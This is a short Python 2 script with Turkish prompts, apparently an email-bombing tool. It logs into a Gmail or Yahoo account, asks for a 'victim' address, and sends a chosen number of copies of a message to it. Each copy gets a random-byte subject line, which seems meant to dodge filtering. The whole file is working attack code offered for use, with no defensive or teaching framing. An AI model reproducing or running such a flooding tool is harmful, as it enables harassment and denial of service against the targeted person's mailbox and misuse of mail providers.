#!/usr/bin/python
import os
import smtplib
import getpass
import sys


server = raw_input ('Server Mail (gmail/yahoo): ')
user = raw_input('Email: ')
passwd = getpass.getpass('Şifre: ')


to = raw_input('\nKurban Maili:  ')
#subject = raw_input('Başlık: ') 
body = raw_input('Mesaj: ')
total = input('Mesaj adeti: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Yahoo yada gmail yazınız.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rTotal emails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Gönderildi'
    print '\n NasQ is One'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()
